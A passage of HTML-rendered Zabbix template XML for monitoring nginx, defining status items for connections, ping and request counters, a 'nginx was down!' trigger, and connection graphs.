class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_contextname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description&gt;reading&lt;/description&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;nginx&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                    &lt;logtimefmt/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;nginx status connections waiting&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;nginx.status[waiting]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;90&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_contextname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description&gt;waiting&lt;/description&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;nginx&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                    &lt;logtimefmt/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;nginx status connections writing&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;nginx.status[writing]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;90&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_contextname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description&gt;writing&lt;/description&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;nginx&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                    &lt;logtimefmt/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;nginx status PING&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;nginx.status[ping]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;30&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_contextname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description&gt;is live&lt;/description&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;nginx&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap&gt;</span><br><span class=\"line\">                        &lt;name&gt;Service state&lt;/name&gt;</span><br><span class=\"line\">                    &lt;/valuemap&gt;</span><br><span class=\"line\">                    &lt;logtimefmt/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;nginx status server accepts&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;nginx.status[accepts]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;90&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;1&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_contextname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description&gt;accepts&lt;/description&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;nginx&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                    &lt;logtimefmt/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;nginx status server handled&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;nginx.status[handled]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;90&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;1&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_contextname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description&gt;handled&lt;/description&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;nginx&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                    &lt;logtimefmt/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;nginx status server requests&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;nginx.status[requests]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;90&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;1&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_contextname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description&gt;requests&lt;/description&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;nginx&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                    &lt;logtimefmt/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">            &lt;/items&gt;</span><br><span class=\"line\">            &lt;discovery_rules/&gt;</span><br><span class=\"line\">            &lt;macros/&gt;</span><br><span class=\"line\">            &lt;templates/&gt;</span><br><span class=\"line\">            &lt;screens/&gt;</span><br><span class=\"line\">        &lt;/template&gt;</span><br><span class=\"line\">    &lt;/templates&gt;</span><br><span class=\"line\">    &lt;triggers&gt;</span><br><span class=\"line\">        &lt;trigger&gt;</span><br><span class=\"line\">            &lt;expression&gt;{Template App NGINX:nginx.status[ping].last()}=0&lt;/expression&gt;</span><br><span class=\"line\">            &lt;name&gt;nginx was down!&lt;/name&gt;</span><br><span class=\"line\">            &lt;url/&gt;</span><br><span class=\"line\">            &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">            &lt;priority&gt;4&lt;/priority&gt;</span><br><span class=\"line\">            &lt;description&gt;NGINX&#x8FDB;&#x7A0B;&#x6570;&#xFF1A;0&#xFF0C;&#x8BF7;&#x6CE8;&#x610F;&lt;/description&gt;</span><br><span class=\"line\">            &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">            &lt;dependencies/&gt;</span><br><span class=\"line\">        &lt;/trigger&gt;</span><br><span class=\"line\">    &lt;/triggers&gt;</span><br><span class=\"line\">    &lt;graphs&gt;</span><br><span class=\"line\">        &lt;graph&gt;</span><br><span class=\"line\">            &lt;name&gt;nginx status connections&lt;/name&gt;</span><br><span class=\"line\">            &lt;width&gt;900&lt;/width&gt;</span><br><span class=\"line\">            &lt;height&gt;200&lt;/height&gt;</span><br><span class=\"line\">            &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt;</span><br><span class=\"line\">            &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt;</span><br><span class=\"line\">            &lt;show_work_period&gt;1&lt;/show_work_period&gt;</span><br><span class=\"line\">            &lt;show_triggers&gt;1&lt;/show_triggers&gt;</span><br><span class=\"line\">            &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">            &lt;show_legend&gt;1&lt;/show_legend&gt;</span><br><span class=\"line\">            &lt;show_3d&gt;0&lt;/show_3d&gt;</span><br><span class=\"line\">            &lt;percent_left&gt;0.0000&lt;/percent_left&gt;</span><br><span class=\"line\">            &lt;percent_right&gt;0.0000&lt;/percent_right&gt;</span><br><span class=\"line\">            &lt;ymin_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymin_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymax_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymax_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt;</span><br><span class=\"line\">            &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt;</span><br><span class=\"line\">            &lt;graph_items&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;0&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;00C800&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;2&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Template App NGINX&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;nginx.status[active]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;1&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;C80000&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;2&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Template App NGINX&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;nginx.status[reading]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;2&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;0000C8&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;2&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Template App NGINX&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;nginx.status[waiting]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;3&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;C800C8&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;2&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Template App NGINX&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;nginx.status[writing]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">            &lt;/graph_items&gt;</span><br><span class=\"line\">        &lt;/graph&gt;</span><br><span class=\"line\">        &lt;graph&gt;</span><br><span class=\"line\">            &lt;name&gt;nginx status server&lt;/name&gt;</span><br><span class=\"line\">            &lt;width&gt;900&lt;/width&gt;</span><br><span class=\"line\">            &lt;height&gt;200&lt;/height&gt;</span><br><span class=\"line\">            &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt;</span><br><span class=\"line\">            &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt;</span><br><span class=\"line\">            &lt;show_work_period&gt;1&lt;/show_work_period&gt;</span><br><span class=\"line\">            &lt;show_triggers&gt;1&lt;/show_triggers&gt;</span><br><span class=\"line\">            &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">            &lt;show_legend&gt;1&lt;/show_legend&gt;</span><br><span class=\"line\">            &lt;show_3d&gt;0&lt;/show_3d&gt;</span><br><span class=\"line\">            &lt;percent_left&gt;0.0000&lt;/percent_left&gt;</span><br><span class=\"line\">            &lt;percent_right&gt;0.0000&lt;/percent_right&gt;</span><br><span class=\"line\">            &lt;ymin_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymin_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymax_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymax_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt;</span><br><span class=\"line\">            &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt;</span><br><span class=\"line\">            &lt;graph_items&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;0&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;00C800&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;2&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span 